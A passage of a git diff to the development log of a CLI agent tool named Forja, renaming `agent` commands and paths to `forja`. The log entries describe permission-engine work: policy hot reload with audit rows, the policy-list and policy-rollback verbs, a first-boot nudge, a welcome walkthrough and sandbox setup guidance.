 3. **Slice 57**: `[seal]` Policy section + bootstrap wire-up — adds `mode`, `interval_decisions`, `interval_seconds`, `endpoint`, `on_failure` keys to the policy schema; bootstrap constructs the right backend based on `mode` and wires it via slice 56's hook.
-4. **Slice 58**: `agent permission seal-verify` CLI verb — runs `verifySealAgainstChain` from the CLI for human-readable diagnostics.
+4. **Slice 58**: `forja permission seal-verify` CLI verb — runs `verifySealAgainstChain` from the CLI for human-readable diagnostics.
 
 After that, `s3-object-lock`, `rfc3161-tsa`, and `git-anchored` backends become independent slices (each ~150 lines + ~10 tests of the same shape as slice 54).
 
@@ -18332,7 +19636,7 @@ Other open spec gaps stay at the same priority as the slice 53 list (§19 migrat
 
 ## [2026-05-11] permission-engine-v2 — slice 53: bootstrap wire-up for `watchAndReload` (§12.3 production caller)
 
-**Done.** Fifty-third slice. Closes the loose end left by slice 52: the file watcher primitive existed but had no production caller. The bootstrap now opts into hot reload via `watchPolicy?: boolean`, attaches the watcher with the SAME `resolveOptions` it used at startup, and emits two new audit-row stages on every reload event — `policy-reloaded` (spec line 743) and `policy-reload-failed` (spec line 737). With this slice, an operator can edit `~/.config/agent/permissions.yaml`, save, and see (a) the engine pick up the new policy on the next `check()`, AND (b) two audit rows in `approvals_log` capturing the hash transition (or the failure reason).
+**Done.** Fifty-third slice. Closes the loose end left by slice 52: the file watcher primitive existed but had no production caller. The bootstrap now opts into hot reload via `watchPolicy?: boolean`, attaches the watcher with the SAME `resolveOptions` it used at startup, and emits two new audit-row stages on every reload event — `policy-reloaded` (spec line 743) and `policy-reload-failed` (spec line 737). With this slice, an operator can edit `~/.config/forja/permissions.yaml`, save, and see (a) the engine pick up the new policy on the next `check()`, AND (b) two audit rows in `approvals_log` capturing the hash transition (or the failure reason).
 
 ### Why this matters
 
@@ -18349,7 +19653,7 @@ The audit emission is the security-critical part: spec §12.3 lines 737/743 dema
 
 ### Decisions
 
-- **Opt-in, not default.** `watchPolicy` defaults to false. One-shot CLI verbs (`agent permission verify`, `agent doctor`) don't pay the inotify cost; only the REPL bootstrap flips it on. Same posture as `acceptBrokenChain` — a knob the caller (CLI driver) chooses, not the engine.
+- **Opt-in, not default.** `watchPolicy` defaults to false. One-shot CLI verbs (`forja permission verify`, `forja doctor`) don't pay the inotify cost; only the REPL bootstrap flips it on. Same posture as `acceptBrokenChain` — a knob the caller (CLI driver) chooses, not the engine.
 - **Wire-up sits AFTER `archivePolicy`, BEFORE the return.** Two reasons. (a) `archiveState` is already computed at that line — reuse the same `controller.get()` snapshot so the refusing guard is consistent. (b) The watcher needs the live `engine` reference; constructing it before the engine exists is impossible. Placing it post-archive also means the wire-up only fires for engines that actually reached a non-refusing state.
 - **`archiveState !== 'refusing'` guard, not `sandbox` flag check.** The bootstrap has TWO refusing paths: (a) early via `buildRefusingResult` (install_id / policy_load failure) which returns BEFORE my wire-up — never reached; (b) late via `sandbox_required_but_unavailable` which transitions at line 371 BEFORE archiveState is captured. The guard catches both because archiveState is read AFTER both transition points. Tests 6 + 7 verify each path explicitly.
 - **`emitPolicyReloadFailedRow` uses the CURRENT (still-authoritative) hash.** Spec line 737-740 says "keep old_policy / unlock / return". The engine's `policy()` returns the unchanged policy because `reloadPolicy()` is non-destructive on failure (slice 51). So `canonicalHash(engine.policy())` IS the old hash. Test 5 pins this: `failRow.policy_hash === sha256:${canonicalHash(r.engine.policy())}`.
@@ -18402,7 +19706,7 @@ The failure path is the security-critical one: a malformed YAML, a lock conflict
 ### Decisions
 
 - **Single integrated function, not a generic `watchPolicyFiles` primitive.** Considered splitting into a generic file-watch helper + a separate reload integration. Decided against: the only realistic caller is the bootstrap, and they want resolvePolicy + reloadPolicy already wired. A generic helper would have one consumer (this one) and tests would need to exercise both layers anyway. Single function keeps the surface small.
-- **Watch each FILE directly, not parent directory.** `fs.watch(file)` is simpler but doesn't catch files CREATED mid-session (a policy file that doesn't exist at watch start won't fire when it shows up). Closing that gap would mean watching the parent dir + filtering by basename — more complexity for a rare case. Operators create policy files via `agent init` (project) or manual setup (user / enterprise), not mid-session. Acceptable trade-off documented in the file header.
+- **Watch each FILE directly, not parent directory.** `fs.watch(file)` is simpler but doesn't catch files CREATED mid-session (a policy file that doesn't exist at watch start won't fire when it shows up). Closing that gap would mean watching the parent dir + filtering by basename — more complexity for a rare case. Operators create policy files via `forja init` (project) or manual setup (user / enterprise), not mid-session. Acceptable trade-off documented in the file header.
 - **Debounce default 100ms, configurable.** Editor saves fire 2-5 events (truncate + write, atomic rename, inode change). 100ms covers every reasonable editor's burst window without making the operator wait perceptibly. Tests pass tiny values (`setTimer` seam) to fire synchronously.
 - **Failed reload keeps OLD policy authoritative.** Spec line 736-740 demands this — "if validate(new_policy) fails: emit policy_reload_failed event with details / keep old_policy / unlock / return". The watcher's failure path NEVER calls `engine.reloadPolicy` (the engine's own reloadPolicy is itself non-destructive on failure per slice 51, but the watcher's pre-checks like resolvePolicy throws + lockConflicts catch failures BEFORE the engine sees them). Tests pin: engine.policy() unchanged after a failed reload.
 - **`onReload` / `onReloadFailed` are observability hooks, not control flow.** They don't block the reload, don't enable retry. The watcher's contract is "best-effort hot reload"; consumers route to audit / log via these callbacks but the watcher proceeds regardless. If a consumer wants to throttle reloads, they wrap watchAndReload.
@@ -18492,7 +19796,7 @@ Other remaining spec work:
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 50: `agent permission policy-rollback` (closes §12.4)
+## [2026-05-11] permission-engine-v2 — slice 50: `forja permission policy-rollback` (closes §12.4)
 
 **Done.** Fiftieth slice. Write side of §12.4 — pairs with slice 49's `policy-list` to close the policy archive surface. The verb is dry-run by default for safety; `--write` commits the canonical JSON bytes to the target file AND emits an audit event per spec line 756 ("Cada rollback é audit event").
 
@@ -18506,20 +19810,20 @@ Until this slice, the operator could SEE policy history (via slice 49's `policy-
 
 | File | Change |
 |---|---|
-| `src/cli/args.ts` | New verb `'policy-rollback'` added to `KNOWN_PERMISSION_VERBS`. New flags `--write` (commit) and `--target <file>` (override default `.agent/permissions.yaml`). `rollbackWrite?: boolean` + `rollbackTarget?: string` on the parsed permission args. Verb-specific validation: requires exactly one `<hash>` positional; rejects `--reason`. Header comment updated to describe both `policy-list` (49) and `policy-rollback` (50). |
+| `src/cli/args.ts` | New verb `'policy-rollback'` added to `KNOWN_PERMISSION_VERBS`. New flags `--write` (commit) and `--target <file>` (override default `.forja/permissions.yaml`). `rollbackWrite?: boolean` + `rollbackTarget?: string` on the parsed permission args. Verb-specific validation: requires exactly one `<hash>` positional; rejects `--reason`. Header comment updated to describe both `policy-list` (49) and `policy-rollback` (50). |
 | `src/cli/run.ts` | Dispatch arm for `args.permission.verb === 'policy-rollback'`. Lazy-imports the handler. |
-| `src/cli/permission-policy-rollback.ts` (new, ~180 lines) | `runPermissionPolicyRollback({hash, target?, write?, json?, dbPath?, env?, now?, cwd?, writeFile?, readFile?, out, err})`. Default target is `.agent/permissions.yaml` resolved against the runner's cwd. Test seams: `writeFile`/`readFile` (filesystem injection so tests don't touch disk), `now` (deterministic audit timestamps), `cwd` (relative target resolution). Two paths: dry-run (default) prints summary (source hash, target file, current vs archive byte counts, "use --write to commit" hint); --write actually writes the canonical JSON bytes to the target AND emits an audit row via the real `createSqliteSink` (tool_name='permission-engine', session_id='cli-policy-rollback', decision='allow', reason_chain with stage='policy-rollback' + to_hash + target). Hash-not-found returns exit 1 with `error: 'not_found'` (plain or JSON). |
-| `tests/cli/permission-policy-rollback.test.ts` (new, 15 tests) | Parser (6: hash captured, --write captured, --target captured, --write on non-rollback rejected, missing hash rejected, --target without value rejected) + handler (9: hash-not-found exit 1, dry-run leaves target unchanged + writeFile not called, dry-run with non-existent target → "will be created" hint, --write overwrites target + emits audit row (verified via the real approvals_log table), --write on non-existent target still works (fresh install), --json dry-run shape, --json --write shape, --json not-found envelope, default target is `.agent/permissions.yaml` relative to cwd). |
+| `src/cli/permission-policy-rollback.ts` (new, ~180 lines) | `runPermissionPolicyRollback({hash, target?, write?, json?, dbPath?, env?, now?, cwd?, writeFile?, readFile?, out, err})`. Default target is `.forja/permissions.yaml` resolved against the runner's cwd. Test seams: `writeFile`/`readFile` (filesystem injection so tests don't touch disk), `now` (deterministic audit timestamps), `cwd` (relative target resolution). Two paths: dry-run (default) prints summary (source hash, target file, current vs archive byte counts, "use --write to commit" hint); --write actually writes the canonical JSON bytes to the target AND emits an audit row via the real `createSqliteSink` (tool_name='permission-engine', session_id='cli-policy-rollback', decision='allow', reason_chain with stage='policy-rollback' + to_hash + target). Hash-not-found returns exit 1 with `error: 'not_found'` (plain or JSON). |
+| `tests/cli/permission-policy-rollback.test.ts` (new, 15 tests) | Parser (6: hash captured, --write captured, --target captured, --write on non-rollback rejected, missing hash rejected, --target without value rejected) + handler (9: hash-not-found exit 1, dry-run leaves target unchanged + writeFile not called, dry-run with non-existent target → "will be created" hint, --write overwrites target + emits audit row (verified via the real approvals_log table), --write on non-existent target still works (fresh install), --json dry-run shape, --json --write shape, --json not-found envelope, default target is `.forja/permissions.yaml` relative to cwd). |
 
 ### Decisions
 
 - **Dry-run by default, `--write` to commit.** Same pattern as `--rm` / `git reset --hard` — destructive operations require explicit opt-in. Operators running `policy-rollback <hash>` for the first time get a "this is what would happen" summary, never a silent file overwrite.
 - **Canonical JSON written byte-for-byte (no YAML formatting).** Canonical JSON IS valid YAML (JSON ⊂ YAML 1.2), so the write is a single `writeFileSync`. Operators with formatted YAML (comments + custom layout) lose those on rollback — acceptable for an emergency-revert path. A future `--preserve-format` flag could merge formatting from the current file, but that's a separate slice.
 - **Hash positional is required, no `--latest` shortcut yet.** Spec §12.4 line 753 mentions "reverte pra última policy válida" — an implicit auto-latest path. Skipped for v1: requiring the hash forces the operator to inspect via `policy-list` first, which is the right discovery flow. `--latest` is a possible follow-up.
-- **Audit row uses the real `createSqliteSink`, not a synthetic JSON write.** The rollback event needs to land in the hash-chained approvals_log so future `agent permission verify` reads it as part of the chain. Reusing the existing sink keeps the chain unbroken and makes the rollback visible to every audit-grade introspection surface (replay, diff, inspect).
+- **Audit row uses the real `createSqliteSink`, not a synthetic JSON write.** The rollback event needs to land in the hash-chained approvals_log so future `forja permission verify` reads it as part of the chain. Reusing the existing sink keeps the chain unbroken and makes the rollback visible to every audit-grade introspection surface (replay, diff, inspect).
 - **Audit row's `policy_hash` is the hash we rolled back TO**, not the current/from hash. The operator's intent is captured: "this rollback authorized the policy at hash X to be active". The reason chain note records both endpoints for forensic completeness.
 - **File-system writes through `writeFile` seam.** Production passes node:fs.writeFileSync; tests pass a capture function. Lets the test suite assert the file-write contract (path + content) without depending on disk state.
-- **Default target resolved against cwd, not against the install root.** `agent permission policy-rollback <hash>` run from `/home/user/projects/foo/` writes to `/home/user/projects/foo/.agent/permissions.yaml` (the project's policy file). Mirrors how `agent init` scaffolds project-local config. Operators wanting user-level rollback pass `--target ~/.config/agent/permissions.yaml` explicitly.
+- **Default target resolved against cwd, not against the install root.** `forja permission policy-rollback <hash>` run from `/home/user/projects/foo/` writes to `/home/user/projects/foo/.forja/permissions.yaml` (the project's policy file). Mirrors how `forja init` scaffolds project-local config. Operators wanting user-level rollback pass `--target ~/.config/forja/permissions.yaml` explicitly.
 - **No backup of the old target file before write.** Considered + rejected: a backup (e.g. `permissions.yaml.bak`) would clutter the project dir without solving anything — the OLD policy is still in the archive table, retrievable via another `policy-rollback` call. The audit row IS the record. Adding a backup file would just be a different surface for the same data.
 
 ### Verification
@@ -18546,11 +19850,11 @@ Other remaining spec work (from the inventory):
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 49: `agent permission policy-list` (§12.4 read side)
+## [2026-05-11] permission-engine-v2 — slice 49: `forja permission policy-list` (§12.4 read side)
 
 **Done.** Forty-ninth slice. Opens the §12.4 thread by shipping the read-only enumeration verb. `policy_archive` (slice 13 / migration 037) has stored every UNIQUE policy hash the engine ever booted with since the v2 audit chain landed; this slice gives operators the CLI to inspect it. Pairs with a future `policy-rollback` (slice 50+) that consumes the same data for the write side.
 
-Spec §12.4 names two operator actions: rollback to last-valid + view archive. This slice ships the view; rollback follows. Spec also says "5 mantidas em `~/.cache/agent/policy_history/`" — the current implementation stores them in the `policy_archive` SQLite table instead, with no retention cap. Future work could add retention if the table grows unbounded in production; for now, every UNIQUE hash stays forever (one row per distinct policy ever booted).
+Spec §12.4 names two operator actions: rollback to last-valid + view archive. This slice ships the view; rollback follows. Spec also says "5 mantidas em `~/.cache/forja/policy_history/`" — the current implementation stores them in the `policy_archive` SQLite table instead, with no retention cap. Future work could add retention if the table grows unbounded in production; for now, every UNIQUE hash stays forever (one row per distinct policy ever booted).
 
 ### Why this matters
 
@@ -18567,7 +19871,7 @@ Without a way to ENUMERATE the archive, the rollback verb has no discovery surfa
 
 ### Decisions
 
-- **Flat verb name `policy-list`, not `policy list` (sub-verb hierarchy).** The spec's literal form is `agent permission policy rollback` (sub-verb). To keep the parser structure simple, I'm using the flat hyphenated form. When `policy-rollback` lands, the user-facing form will still be `policy-rollback` (matching this slice's pattern). If we later want to support the spec's literal sub-verb form, that's a parser refactor that affects both at once.
+- **Flat verb name `policy-list`, not `policy list` (sub-verb hierarchy).** The spec's literal form is `forja permission policy rollback` (sub-verb). To keep the parser structure simple, I'm using the flat hyphenated form. When `policy-rollback` lands, the user-facing form will still be `policy-rollback` (matching this slice's pattern). If we later want to support the spec's literal sub-verb form, that's a parser refactor that affects both at once.
 - **`current` is `MAX(last_seen_ms)`, not bootstrap-passed.** Threading the active policy hash from bootstrap to the CLI would require an env var or a side-channel. `MAX(last_seen_ms)` is reliable in practice — every bootstrap upserts the active policy, bumping its last_seen. Operators reading the list see the just-booted row marked even when running `policy-list` against a different process's DB.
 - **Plain output truncates hash to 24 chars.** Full SHA256 hashes are 64 hex chars + `sha256:` prefix = 71 chars total — too wide for a one-line row. Truncation matches what `git log --oneline` does. Operators wanting the full hash use JSON mode.
 - **`bytes` field in output is `canonical_json.length`.** Helps operators sanity-check "this is a 12 KB policy" vs "this is a 200 KB policy" without dumping the canonical JSON. Surfaces the upper bound on rollback impact.
@@ -18585,7 +19889,7 @@ Without a way to ENUMERATE the archive, the rollback verb has no discovery surfa
 ### Next
 
 §12.4 thread — remaining slices:
-1. **`agent permission policy-rollback <hash> [--target <file>] [--dry-run] [--json]`** — the write side. Reads the canonical JSON from archive, writes it to the target file (default `.agent/permissions.yaml`). Dry-run prints the diff without committing. Emits an audit event per spec line 756. The canonical JSON is valid YAML (JSON is a subset of YAML 1.2) so the write is trivial; the operator's comments + custom formatting are lost on rollback, which is acceptable for an emergency-revert use case.
+1. **`forja permission policy-rollback <hash> [--target <file>] [--dry-run] [--json]`** — the write side. Reads the canonical JSON from archive, writes it to the target file (default `.forja/permissions.yaml`). Dry-run prints the diff without committing. Emits an audit event per spec line 756. The canonical JSON is valid YAML (JSON is a subset of YAML 1.2) so the write is trivial; the operator's comments + custom formatting are lost on rollback, which is acceptable for an emergency-revert use case.
 
 Other remaining spec work: §12.3 hot reload (medium, state machine ready), §7.3 sealing (audit-grade), §19 migration (medium), conformance sandbox_select platform-pinned cases (slice 48 follow-up).
 
@@ -18688,11 +19992,11 @@ Other remaining spec work (from inventory): §12.4 rollback CLI (small), §12.3 
 
 ## [2026-05-11] permission-engine-v2 — slice 46: first-boot nudge (closes §13.5)
 
-**Done.** Forty-sixth slice. Closes the §13.5 first-boot UX loop: when an operator runs Forja for the first time (install_id file doesn't exist) on any verb except the §13 setup verbs themselves, a one-line stderr nudge points them at `agent welcome`. Self-extinguishing — the next normal bootstrap creates install_id and the nudge stops firing.
+**Done.** Forty-sixth slice. Closes the §13.5 first-boot UX loop: when an operator runs Forja for the first time (install_id file doesn't exist) on any verb except the §13 setup verbs themselves, a one-line stderr nudge points them at `forja welcome`. Self-extinguishing — the next normal bootstrap creates install_id and the nudge stops firing.
 
 ### Why this matters
 
-Slices 43-45 built the §13 surface (doctor + sandbox setup + welcome) but operators have to KNOW the verbs exist to use them. A new user installing Forja and typing `agent "what's in this repo?"` would get the normal bootstrap output with no hint that there's a guided walkthrough available. The nudge closes the discovery gap — first-run users see the pointer, run `agent welcome`, get the full intro flow, then never see the nudge again.
+Slices 43-45 built the §13 surface (doctor + sandbox setup + welcome) but operators have to KNOW the verbs exist to use them. A new user installing Forja and typing `agent "what's in this repo?"` would get the normal bootstrap output with no hint that there's a guided walkthrough available. The nudge closes the discovery gap — first-run users see the pointer, run `forja welcome`, get the full intro flow, then never see the nudge again.
 
 ### Surface
 
@@ -18706,32 +20010,32 @@ Slices 43-45 built the §13 surface (doctor + sandbox setup + welcome) but opera
 ### Behavior
 
 ```
-$ HOME=/tmp/fresh agent --list-sessions
-forja: first run detected — try `agent welcome` for a setup walkthrough.
+$ HOME=/tmp/fresh forja --list-sessions
+forja: first run detected — try `forja welcome` for a setup walkthrough.
 no sessions found.
 
-$ HOME=/tmp/fresh agent welcome
+$ HOME=/tmp/fresh forja welcome
 Welcome to Forja!
 ...                                # NO nudge — operator is already on the setup path
 
-$ HOME=/tmp/fresh agent doctor
+$ HOME=/tmp/fresh forja doctor
 platform                           # NO nudge — same rationale
   status: ok
 ...
 
 # After running anything that calls ensureInstallId (single-shot prompt, REPL,
-# `agent permission verify`), the install_id file exists and the nudge
+# `forja permission verify`), the install_id file exists and the nudge
 # stops firing for every subsequent verb.
 ```
 
 ### Decisions
 
-- **Suppress the nudge for §13 verbs (welcome/doctor/sandbox).** The operator running any of these is already inspecting the environment; pointing them at `agent welcome` from inside the welcome flow is silly. The suppression list is narrow — every OTHER verb (init, prompt, --list-sessions, permission *, recap, etc.) gets the nudge on first boot.
-- **Don't suppress for `init`.** Init is project-local scaffolding (.agent/permissions.yaml); welcome is install-level. A new operator running `agent init` to scaffold a policy file in their project should still see the install-level pointer — they'll need to run a prompt or REPL eventually, and welcome is the natural next step.
-- **Stderr, not stdout.** Project convention (CLAUDE.md hard rules: "stdout is pure, stderr is for logs"). JSON consumers piping `agent --list-sessions --json` get pure NDJSON on stdout; the nudge lands on stderr where it doesn't pollute the parse stream.
+- **Suppress the nudge for §13 verbs (welcome/doctor/sandbox).** The operator running any of these is already inspecting the environment; pointing them at `forja welcome` from inside the welcome flow is silly. The suppression list is narrow — every OTHER verb (init, prompt, --list-sessions, permission *, recap, etc.) gets the nudge on first boot.
+- **Don't suppress for `init`.** Init is project-local scaffolding (.forja/permissions.yaml); welcome is install-level. A new operator running `forja init` to scaffold a policy file in their project should still see the install-level pointer — they'll need to run a prompt or REPL eventually, and welcome is the natural next step.
+- **Stderr, not stdout.** Project convention (CLAUDE.md hard rules: "stdout is pure, stderr is for logs"). JSON consumers piping `forja --list-sessions --json` get pure NDJSON on stdout; the nudge lands on stderr where it doesn't pollute the parse stream.
 - **Lazy import of `isFirstBoot`.** The check involves an `existsSync` syscall + path derivation; not free. Lazy-loading it means `--help` / `--version` (which short-circuit above) skip the check entirely. Help and version are also the noisiest places to add anything; keeping them lean.
 - **`isFirstBoot()` returns false in degraded env.** When $HOME / $XDG_CONFIG_HOME / %APPDATA% all missing, `installIdPath` returns null. The nudge contract says "render when first boot", not "render when something's wrong" — silent false in that case keeps the nudge focused. The bootstrap path will throw with the real "cannot determine config directory" error on the NEXT call.
-- **Self-extinguishing — no flag to suppress permanently.** A `--no-nudge` flag would add config-state to the operator's mental model for a one-time message. The nudge fires at most a handful of times per install (any normal verb that doesn't suppress + creates install_id → nudge stops). Operators who run `agent welcome` first never see it.
+- **Self-extinguishing — no flag to suppress permanently.** A `--no-nudge` flag would add config-state to the operator's mental model for a one-time message. The nudge fires at most a handful of times per install (any normal verb that doesn't suppress + creates install_id → nudge stops). Operators who run `forja welcome` first never see it.
 
 ### Verification
 
@@ -18749,39 +20053,39 @@ platform                           # NO nudge — same rationale
 
 Highest-value remaining work outside §13 (from the spec inventory):
 1. **macOS sandbox-exec** — second-biggest platform gap. SBPL profile generator + runtime wrap. Multi-slice undertaking parallel to slices 18-21 on Linux.
-2. **§12.4 `agent permission policy rollback`** — `policy_history` exists; CLI doesn't. Small.
+2. **§12.4 `forja permission policy rollback`** — `policy_history` exists; CLI doesn't. Small.
 3. **§12.3 hot reload** — file-watch + `reload_policy` transition (state machine ready). Medium.
 4. **§7.3 external sealing** — worm-file backend (simplest of the four). Audit-grade.
 5. **§19 v1→v2 migration** — translator + compat layer. Medium.
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 45: `agent welcome` — first-boot walkthrough (§13.5)
+## [2026-05-11] permission-engine-v2 — slice 45: `forja welcome` — first-boot walkthrough (§13.5)
 
-**Done.** Forty-fifth slice. Third on the §13 thread. Composes slice 43 (`agent doctor`) + slice 44 (`agent sandbox setup`) into a single guided walkthrough for first-time operators. Spec §13.5 calls for first-boot UX; this slice ships it as an operator-invokable verb.
+**Done.** Forty-fifth slice. Third on the §13 thread. Composes slice 43 (`forja doctor`) + slice 44 (`forja sandbox setup`) into a single guided walkthrough for first-time operators. Spec §13.5 calls for first-boot UX; this slice ships it as an operator-invokable verb.
 
-Designed for first-time use but explicitly idempotent — running `agent welcome` later as a "checkup" is harmless and useful. The verb reads host state and renders recommendations; it never writes anything.
+Designed for first-time use but explicitly idempotent — running `forja welcome` later as a "checkup" is harmless and useful. The verb reads host state and renders recommendations; it never writes anything.
 
 ### Why this matters
 
-After slices 43 and 44, the operator has the tools (doctor + setup) but no integrated entry point. A new user landing on Forja would have to know to type `agent doctor`, parse the output, decide if `agent sandbox setup` is needed, run that, then figure out what to do with their environment. That's three discovery hops. `agent welcome` collapses them into one: a single command that walks through the entire first-boot story and ends with a "what to do next" menu.
+After slices 43 and 44, the operator has the tools (doctor + setup) but no integrated entry point. A new user landing on Forja would have to know to type `forja doctor`, parse the output, decide if `forja sandbox setup` is needed, run that, then figure out what to do with their environment. That's three discovery hops. `forja welcome` collapses them into one: a single command that walks through the entire first-boot story and ends with a "what to do next" menu.
 
-Spec §13.5 ("first-boot UX") doesn't dictate auto-invocation — operators run `agent welcome` themselves, the same way they run `agent doctor`. Bootstrap auto-detection of first-boot (no install_id → suggest `agent welcome`) is a future slice that touches the bootstrap path; this slice ships the surface that detection points at.
+Spec §13.5 ("first-boot UX") doesn't dictate auto-invocation — operators run `forja welcome` themselves, the same way they run `forja doctor`. Bootstrap auto-detection of first-boot (no install_id → suggest `forja welcome`) is a future slice that touches the bootstrap path; this slice ships the surface that detection points at.
 
 ### Surface
 
 | File | Change |
 |---|---|
-| `src/cli/args.ts` | New `parseWelcomeSubcommand`. Top-level verb matching `agent doctor` shape — no flags except `--help`. New `welcome?: true` on parsed args (a bare presence marker; no per-verb config needed). Help text updated with `agent welcome` example. Wired into `parseArgs` after `parseSandboxSubcommand`. |
+| `src/cli/args.ts` | New `parseWelcomeSubcommand`. Top-level verb matching `forja doctor` shape — no flags except `--help`. New `welcome?: true` on parsed args (a bare presence marker; no per-verb config needed). Help text updated with `forja welcome` example. Wired into `parseArgs` after `parseSandboxSubcommand`. |
 | `src/cli/run.ts` | New dispatch arm for `args.welcome === true` — lazy-imports `./welcome.ts`. Same lifecycle-mode shape as the other §13 verbs. |
 | `src/cli/index.ts` | `promptOptional` list extended with `args.welcome === true` — same TTY-gate exemption as doctor / sandbox setup. |
-| `src/cli/welcome.ts` (new, ~80 lines) | `runWelcome({env?, which?, readOsRelease?, platform?, arch?, out, err}): Promise<number>`. All five test seams forwarded from the inner verbs. Output structure: (1) intro banner, (2) doctor section with divider header + `runDoctor` output, (3) sandbox setup section with divider + `runSandboxSetup` output, (4) next-steps menu. Exit code is `Math.max(doctorCode, setupCode)` — any inner failure surfaces via exit, so CI pre-deploy hooks can run `agent welcome` and fail-fast on environment issues. |
+| `src/cli/welcome.ts` (new, ~80 lines) | `runWelcome({env?, which?, readOsRelease?, platform?, arch?, out, err}): Promise<number>`. All five test seams forwarded from the inner verbs. Output structure: (1) intro banner, (2) doctor section with divider header + `runDoctor` output, (3) sandbox setup section with divider + `runSandboxSetup` output, (4) next-steps menu. Exit code is `Math.max(doctorCode, setupCode)` — any inner failure surfaces via exit, so CI pre-deploy hooks can run `forja welcome` and fail-fast on environment issues. |
 | `tests/cli/welcome.test.ts` (new, 9 tests) | Parser (4: verb recognized, --help short-circuits, unknown flag rejected, positional rejected) + handler (5: all-green renders all four sections + exit 0, missing sandbox/git surfaces warnings + exit 0, non-writable HOME → exit 1 via inner doctor fail, sections clearly delimited by box-drawing dividers, macOS scenario shows path-broken message not install command). |
 
 ### Sample output
 
 ```
-$ agent welcome
+$ forja welcome
 Welcome to Forja!
 
 Let's check your environment first, then walk you through how to get started.
@@ -18800,7 +20104,7 @@ sandbox
 
 config_dir
   status: ok
-  /home/lex/.config/agent
+  /home/lex/.config/forja
 
 data_dir
   status: ok
@@ -18818,28 +20122,28 @@ Sandbox setup
 
 Platform: linux x64
 
-bwrap is already installed. Run 'agent doctor' to verify the full health check.
+bwrap is already installed. Run 'forja doctor' to verify the full health check.
 
 
 ────────────────────────────────────────────────────────────
 Next steps
 ────────────────────────────────────────────────────────────
 
-  agent init                Generate a permission policy in .agent/
+  forja init                Generate a permission policy in .forja/
   agent "your prompt"        Ask the agent something
-  agent --explain-permissions
+  forja --explain-permissions
                             Show the resolved policy + per-section attribution
-  agent permission grants    List active grants
-  agent --help               See all options
+  forja permission grants    List active grants
+  forja --help               See all options
 
-Run `agent doctor` any time to re-check the environment.
+Run `forja doctor` any time to re-check the environment.
 ```
 
 ### Decisions
 
-- **Plain text only — no `--json` flag.** Welcome is an interactive walkthrough surface. Operators wanting structured data call `agent doctor --json` and `agent sandbox setup --json` directly; those are the headless/CI surfaces. Adding `--json` to welcome would produce a doubly-wrapped envelope that doesn't simplify anything.
+- **Plain text only — no `--json` flag.** Welcome is an interactive walkthrough surface. Operators wanting structured data call `forja doctor --json` and `forja sandbox setup --json` directly; those are the headless/CI surfaces. Adding `--json` to welcome would produce a doubly-wrapped envelope that doesn't simplify anything.
 - **Welcome calls the existing verbs verbatim, no compute extraction.** I considered exporting `buildDoctorChecks` and `computeRecommendation` so welcome could compose structured results into a custom render. Rejected: it'd require refactoring both inner modules plus a third render path, all to produce output that looks like the verbs already do. The current shape — section dividers around verbatim verb output — reads cleanly and keeps the modules independent. Future re-rendering (if welcome wants its own formatting) can extract then.
-- **Exit code is `Math.max(doctorCode, setupCode)`.** Doctor returns 1 on any fail check; sandbox setup returns 1 only on internal failure. Either non-zero → welcome non-zero. Surfaces real environment failures to CI / pre-deploy scripts that run `agent welcome` as a sanity check.
+- **Exit code is `Math.max(doctorCode, setupCode)`.** Doctor returns 1 on any fail check; sandbox setup returns 1 only on internal failure. Either non-zero → welcome non-zero. Surfaces real environment failures to CI / pre-deploy scripts that run `forja welcome` as a sanity check.
 - **`welcome?: true` instead of `welcome?: { ...config }`.** No per-verb config exists (no flags). A bare presence marker is enough; growing to `{}` adds noise for no semantic benefit. The dispatch reads `args.welcome === true` explicitly.
 - **Box-drawing dividers (─×60) frame the three sections.** Matches the in-REPL welcome banner conventions and reads cleanly in 80+ col terminals. Plain dashes (`-` × 60) would work too but the box-drawing chars give clearer visual separation when the output is also colorized later.
 - **Idempotent + always-on test seams.** Welcome forwards every test seam from doctor + sandbox setup. Tests pin specific scenarios (all-green / missing-bwrap / non-writable HOME / macOS path-broken) without touching the runner's actual environment. Production callers leave the seams undefined and the system probes run.
@@ -18855,7 +20159,7 @@ Run `agent doctor` any time to re-check the environment.
 ### Next
 
 §13 platform provisioning — remaining work:
-1. **First-boot auto-detection**: on bootstrap, when install_id is missing, print a one-line nudge `(First time? Try: agent welcome)` before opening the REPL. Smaller scope than this slice; just plumbing in the bootstrap path.
+1. **First-boot auto-detection**: on bootstrap, when install_id is missing, print a one-line nudge `(First time? Try: forja welcome)` before opening the REPL. Smaller scope than this slice; just plumbing in the bootstrap path.
 2. **Broker/worker architecture**: spec §13.7. Multi-slice.
 3. **Doctor extensions**: kernel-feature probe (Linux unshare / user namespaces / cgroups), `/tmp` size + permissions, container detection (docker / podman / k8s), Forja own-binary integrity.
 
@@ -18863,17 +20167,17 @@ Non-§13 successors: macOS sandbox-exec (the second-biggest platform gap), MCP-t
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 44: `agent sandbox setup` (§13 guided sandbox bootstrap)
+## [2026-05-11] permission-engine-v2 — slice 44: `forja sandbox setup` (§13 guided sandbox bootstrap)
 
-**Done.** Forty-fourth slice. Second on the §13 thread. Direct follow-on to slice 43's `agent doctor`: when doctor reports `sandbox: warn` (no bwrap on Linux, or sandbox-exec missing on macOS), this surface tells the operator HOW to fix it — distro detection + the exact install command + a verification step pointing back at doctor.
+**Done.** Forty-fourth slice. Second on the §13 thread. Direct follow-on to slice 43's `forja doctor`: when doctor reports `sandbox: warn` (no bwrap on Linux, or sandbox-exec missing on macOS), this surface tells the operator HOW to fix it — distro detection + the exact install command + a verification step pointing back at doctor.
 
 Per spec §13.1 ("detect, don't distribute"), this verb NEVER auto-installs. It prints the recommended command and the operator runs it themselves. Same philosophy as `npm doctor` or `git status`: surface the right action, don't take it.
 
 ### Why this matters
 
-`agent doctor` (slice 43) tells the operator WHAT's missing; this slice tells them WHAT TO DO about it. Without setup, a fresh Linux user who runs doctor and sees "sandbox: warn — install bubblewrap" has to figure out the right command for their distro themselves. That's a real bar for first-boot — every distribution has a different incantation (`apt`, `dnf`, `pacman`, `apk`, etc), and operators new to Forja shouldn't have to do that lookup.
